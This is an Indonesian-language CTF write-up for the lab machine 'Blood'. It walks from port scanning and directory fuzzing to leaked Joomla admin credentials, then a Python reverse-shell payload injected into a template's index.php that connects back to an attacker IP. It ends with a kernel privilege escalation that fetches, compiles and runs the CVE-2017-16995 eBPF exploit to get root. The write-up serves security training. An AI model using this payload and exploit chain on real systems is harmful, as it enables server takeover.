# Writeup — Blood

**Platform:** HackTrace **Difficulty:** Easy **OS:** Linux **IP:** 10.1.2.104

---

## Deskripsi

> _"I was told that the owner of the machine had taken the necessary hardening, including conducting periodic checks. See if you can prove him wrong."_

Pemilik mesin mengklaim telah melakukan hardening dan pengecekan berkala. Tugas kita adalah membuktikan bahwa klaim tersebut salah dengan mendapatkan akses root ke sistem.

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- 10.1.2.104
```

Hasil scan menunjukkan dua port yang terbuka:

```bash
22/tcp open  ssh   OpenSSH 7.5p1 Ubuntu 10ubuntu0.1
80/tcp open  http  Apache httpd 2.4.27 (Ubuntu)
```

Dari hasil scan HTTP, ditemukan `robots.txt` yang mengekspos beberapa direktori Joomla:

```
/joomla/administrator/ /administrator/ /bin/ /cache/
/cli/ /components/ /includes/ /installation/ /language/
/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
```

Mengakses `http://10.1.2.104/` menampilkan halaman default Apache2 Ubuntu, sedangkan `http://10.1.2.104/administrator` mengarah ke halaman login **Joomla! CMS**. Terdapat petunjuk menarik pada meta tag halaman tersebut:

html

```html
<meta name="description" content="Punya wawan" />
```

Ini mengindikasikan kemungkinan username: **wawan**.

---

## Enumeration Web

### Directory Fuzzing

bash

```bash
feroxbuster -u http://10.1.2.104/ \
  -w /home/greed/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 --filter-status 404,400 -k --no-recursion -x php,txt -o 80.txt
```

Dari hasil fuzzing ditemukan **direktori backup** yang menyimpan file berisi kredensial:

```
Username : wawan
Password : jangansampelupa
```

---

## Initial Access — Remote Code Execution via Joomla

### Login ke Admin Panel

Menggunakan kredensial yang ditemukan untuk login ke Joomla administrator:

```
http://10.1.2.104/administrator
Username : wawan
Password : jangansampelupa
```

### Menyisipkan Reverse Shell

Setelah berhasil login sebagai administrator, navigasi ke:

```
Extensions → Templates → Templates → Protostar → index.php
```

Sisipkan payload reverse shell Python di bagian atas file `index.php`:

```php
<?php
exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.18.200.142\",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
?>
```

Setup listener di mesin penyerang:

```bash
nc -lvnp 4445
```

Trigger shell dengan mengakses halaman depan situs. Shell masuk sebagai `www-data`.

### User Flag

bash

```bash
cat /var/www/html/user.txt
```

---

## Privilege Escalation — CVE-2017-16995 eBPF Verifier

### Enumerasi Sistem

Menjalankan `linux-exploit-suggester` untuk mencari potensi eksploit pada kernel:


```bash
./linux-exploit-suggester.sh
```

Hasil menunjukkan kernel sangat rentan:

```
Linux blood 4.13.0-16-generic #19-Ubuntu SMP Wed Oct 11 18:35:14 UTC 2017

[+] [CVE-2017-16995] eBPF_verifier
    Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
    Exposure: probable
    Tags: ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
    Download URL: https://www.exploit-db.com/download/45010
```

### Eksploitasi Kernel

Download exploit, transfer ke target, lalu compile dan jalankan:

**Di mesin penyerang:**


```bash
wget https://www.exploit-db.com/download/45010 -O xpl.c
python3 -m http.server 8080
```

**Di mesin target:**

bash

```bash
cd /tmp
wget http://10.18.200.142:8080/xpl.c
gcc xpl.c -o xpl
chmod +x xpl
./xpl
```

**Output exploit:**

```
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] credentials patched, launching shell...
# whoami
root
```

### Root Flag


```bash
cat /root/root.txt
```
